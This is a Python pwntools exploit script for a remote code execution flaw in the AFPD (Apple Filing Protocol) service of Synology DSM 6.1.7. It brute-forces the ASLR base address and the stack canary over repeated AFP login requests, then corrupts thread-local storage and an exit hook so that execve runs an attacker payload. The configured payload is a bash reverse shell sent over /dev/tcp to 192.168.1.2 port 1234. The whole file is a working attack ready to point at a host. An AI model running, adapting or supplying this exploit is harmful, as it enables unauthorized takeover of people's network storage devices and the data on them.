#!/usr/bin/python3
# Synology DSM 6.1.7-15284 Update 3 AFPD v3.1.8 RCE
# faust93 2023

from pwn import *
import sys

HOST = "192.168.1.106"
PORT = 548

DSIFUNC_CLOSE = 1
DSIFUNC_CMD = 2
DSIFUNC_STAT = 3
DSIFUNC_OPEN = 4
DSIFUNC_TICKLE = 5
DSIFUNC_WRITE = 6
DSIFUNC_ATTN = 8
DSIFUNC_MAX = 8

DSIOPT_ATTNQUANT = 1

AFP_LOGIN = 0x12
AFP_LOGINCONT = 0x13
AFP_LOGOUT = 0x14
AFP_LOGINEXT = 0x3f

#payload = [ b"/usr/bin/python\x00", b"-m\x00", b"SimpleHTTPServer\x00", b"8080\x00"]
payload = [ b"/bin/bash\x00", b"-c\x00", b"/bin/bash -i &> /dev/tcp/192.168.1.2/1234 <&1\x00"]

def dsi_block(flags, command, requestID, doff, dsilen, reserved):
	block = p8(flags)
	block += p8(command)
	block += p16(requestID)
	block += p32(doff, endian="big")
	block += p32(dsilen, endian="big")
	block += p32(reserved)

	return block

def send_dsi_package(block_cmd, request_id, doff, dsilen, reserved, payload):
	package = dsi_block(0, block_cmd, request_id, doff, dsilen, reserved)
	package += payload
	r.send(package)


def brute_aslr(r, laddr, tune=False):
	cmd = p8(DSIOPT_ATTNQUANT)
	cmd += p8(4)
	cmd += p32(0x1337)
	send_dsi_package(DSIFUNC_OPEN, 0x100, 0, len(cmd), 0, cmd)

	rbuf = r.recv(0x1c)

	user = b"admin"
	version = b"AFP2.2"
	uams = b"DHX"

	command = p8(AFP_LOGIN)
	command += p8(len(version)) + version
	command += p8(len(uams)) + uams
	command += p8(len(user)) + user
	command += b"A"*(0x101000 - 0x10 - len(command))

	command += cyclic_metasploit(5824)
	if tune is False:
		command += laddr
	else:
		command += p64(laddr)
		command += p64(laddr + 0x3a80)
		command += p64(0x0)
		command += p64(laddr - 0x24f9c0)
		command += p64(laddr - 0x24ffc0)
		command += p64(laddr - 0x24f0c0)
		command += p64(0x0)
		command += p64(0x0)
		command += p64(0x0)  # exit func
		command += p64(laddr - 0x900)
		command += p64(0x0)
		command += p64(0x0)
		command += p64(0x0)
		command += p64(0x0)
		command += p64(0x0)
		command += p64(0x0)
		command += p64(0x51)
		command += p64(laddr + 0x6c0aeb)
		command += p64(laddr + 0x2000)
		command += p64(0x0)
		command += p64(0xffffffffffffffff)
		command += p64(0xffffffffffffffff)
		command += p64(0xffffffffffffffff)
		command += p64(0x0)

		# tcbhead
		command += p64(laddr + 0x45b51c0)
		command += p64(laddr + 0x45b5ad0)
		command += p64(laddr + 0x45b51c0)
		command += p64(0x0)
		command += p64(0x0)

	send_dsi_package(DSIFUNC_CMD, 0x100, len(command), len(command), 0, command)

	cmd = p8(DSIOPT_ATTNQUANT)
	cmd += p8(4)
	cmd += p32(0x1337)
	send_dsi_package(DSIFUNC_CLOSE, 0x100, 0, len(cmd), 0, cmd)

	rbuf = r.recv(timeout=2)
	return len(rbuf)

def brute_canary(r, laddr, seq):
	cmd = p8(DSIOPT_ATTNQUANT)
	cmd += p8(4)
	cmd += p32(0x1337)
	send_dsi_package(DSIFUNC_OPEN, 0x100, 0, len(cmd), 0, cmd)

	rbuf = r.recv(0x1c)

	user = b"admin"
	version = b"AFP2.2"
	uams = b"DHX"

	command = p8(AFP_LOGIN)
	command += p8(len(version)) + version
	command += p8(len(uams)) + uams
	command += p8(len(user)) + user
	command += b"A"*(0x101000 - 0x10 - len(command))

	command += cyclic_metasploit(5824)
	command += p64(laddr)
	command += p64(laddr + 0x3a80)
	command += p64(0x0)
	command += p64(laddr - 0x24f9c0)
	command += p64(laddr - 0x24ffc0)
	command += p64(laddr - 0x24f0c0)
	command += p64(0x0)
	command += p64(0x0)
	command += p64(0x0)  # exit func
	command += p64(laddr - 0x900)
	command += p64(0x0)
	command += p64(0x0)
	command += p64(0x0)
	command += p64(0x0)
	command += p64(0x0)
	command += p64(0x0)
	command += p64(0x51)
	command += p64(laddr + 0x6c0aeb)
	command += p64(laddr + 0x2000)
	command += p64(0x0)
	command += p64(0xffffffffffffffff)
	command += p64(0xffffffffffffffff)
	command += p64(0xffffffffffffffff)
	command += p64(0x0)

	# tcbhead
	command += p64(laddr + 0x45b51c0)
	command += p64(laddr + 0x45b5ad0)
	command += p64(laddr + 0x45b51c0)
	command += p64(0x0)
	command += p64(0x0)
	command += seq   # stack canary

	send_dsi_package(DSIFUNC_CMD, 0x100, len(command), len(command), 0, command)

	cmd = p8(DSIOPT_ATTNQUANT)
	cmd += p8(4)
	cmd += p32(0x1337)
	send_dsi_package(DSIFUNC_CLOSE, 0x100, 0, len(cmd), 0, cmd)

	rbuf = r.recv()
	return


def exploit(r, laddr, canary):
	cmd = p8(DSIOPT_ATTNQUANT)
	cmd += p8(4)
	cmd += p32(0x1337)
	send_dsi_package(DSIFUNC_OPEN, 0x100, 0, len(cmd), 0, cmd)
	rbuf = r.recv(0x1c)

	rol = lambda val, r_bits, max_bits: \
		(val << r_bits%max_bits) & (2**max_bits-1) | \
		((val & (2**max_bits-1)) >> (max_bits-(r_bits%max_bits)))

	user = b"admin"
	version = b"AFP2.2"
	uams = b"DHX"

	command = p8(AFP_LOGIN)
	command += p8(len(version)) + version
	command += p8(len(uams)) + uams
	command += p8(len(user)) + user
	send_dsi_package(DSIFUNC_CMD, 0x100, len(command), len(command), 0, command)
	rbuf = r.recv()

	# overflow+disconnect
	command = p8(AFP_LOGIN)
	command += p8(len(version)) + version
	command += p8(len(uams)) + uams
	command += p8(len(user)) + user
	command += p8(0x0)
	command += p8(0x0)
	command += p8(0x0)
	command += p8(0x0)
	command += p8(0x0)
	command += p8(0x0)
	command += p64(0x0)

	heap = laddr + 0x44b2a40 # heap start addr

	command += p64(rol(laddr - 0x2e6930, 0x11, 64))  # execve() ptr (1) 0x7f0189c25030
	command += p64(heap + 0xc0) # payload 1st arg offset
	command += p64(0x0)
	command += p64(0x0) # execve environ

	if len(payload) > 9:
		log.error("Payload error, 9 arguments max")
		sys.exit()

	# new dtv
	# populating with argv offsets since %rsi points here during execve call
	args_ptr = heap + 0xc0 # payload argv array 1st arg offset
	for a in payload:
		command += p64(args_ptr) # rsi, execve argv[] (0x7f0189c25000 + offset) (2)
		args_ptr += len(a)
	command += p64(0x0)

	for _ in range(len(payload), 9):
		command += p64(0x1)

	command += p64(laddr + 0x45b5100)
	command += p64(0x1)
	command += p64(laddr + 0x45b50e0)
	command += p64(0x1)

	# payload, heap + 0xc0
	for p in payload:
	    command += p
	command += b"A"*(0x101000 - 0x10 - len(command))

	# tls
	command += cyclic_metasploit(5824)
	command += p64(laddr)  # *0x7f0189d276c0
	command += p64(laddr + 0x3a80)
	command += p64(0x0)
	command += p64(laddr - 0x24f9c0)
	command += p64(laddr - 0x24ffc0)
	command += p64(laddr - 0x24f0c0)
	command += p64(0x0)
	command += p64(0x0)
	command += p64(heap + 0x30)  # exit hook (1)
	command += p64(laddr - 0x900)
	command += p64(0x0)
	command += p64(0x0)
	command += p64(0x0)
	command += p64(0x0)
	command += p64(0x0)
	command += p64(0x0)
	command += p64(0x51)
	command += p64(laddr + 0x6c0aeb)
	command += p64(laddr + 0x2000)
	command += p64(0x0)
	command += p64(0xffffffffffffffff)
	command += p64(0xffffffffffffffff)
	command += p64(0xffffffffffffffff)
	command += p64(0x0)

	# tcbhead
	command += p64(laddr + 0x45b51c0)
	command += p64(heap + 0x50) # new dtv
	command += p64(laddr + 0x45b51c0)
	command += p64(0x0)
	command += p64(0x0)
	command += p64(canary) # stack canary
	command += p64(0x0) # ptrmangle
	send_dsi_package(DSIFUNC_CLOSE, 0x100, len(command), len(command), 0, command)
	rbuf = r.recv()
	return


# context.log_level = 'WARNING'
if len(sys.argv) == 3:
	leak_addr = int(sys.argv[1], 16) # leak address hex
	canary = int(sys.argv[2], 16)    # canary hex
	r = remote(HOST, PORT) #, level='error')
	exploit(r, leak_addr, canary)
	r.close()
else:
	log.success("Bruteforcing ASLR")
	addr = b'\xc0'
	while len(addr) < 6:
		for i in range(256):
			try:
				print(".", end='', flush=True)
				r = remote(HOST, PORT, level='error')
				ret = brute_aslr(r, addr + p8(i))
				if ret == 0:
					raise
				addr += p8(i)
				r.close()
				print("")
				log.success(hex(u64(addr.ljust(8, b'\x00'))))
				break
			except:
				r.close()
	leak_addr = int.from_bytes(addr, 'little')
	log.success(f"Leak address: {hex(leak_addr)}")

	log.success(f"Tune leak address {hex(leak_addr)}")
	for i in range(256):
		try:
			r = remote(HOST, PORT, level='error')
			ret = brute_aslr(r, leak_addr, True)
			r.close()
			if ret == 0:
				raise
			log.success(hex(leak_addr))
			break
		except:
			leak_addr += 0x100
			log.warning(hex(leak_addr))
			r.close()

	log.success("Bruteforcing canary")
	cnr = b'\x00'
	while len(cnr) < 8:
		for i in range(256):
			try:
				print(".", end='', flush=True)
				r = remote(HOST, PORT, level='error')
				brute_canary(r, leak_addr, cnr + p8(i))
				cnr += p8(i)
				r.close()
				print("")
				log.success(hex(u64(cnr.ljust(8, b'\x00'))))
				break
			except:
				r.close()
	canary = int.from_bytes(cnr, 'little')
	log.success(f"Canary: {hex(canary)}")

	r = remote(HOST, PORT) #, level='error')
	exploit(r, leak_addr, canary)
	r.close()
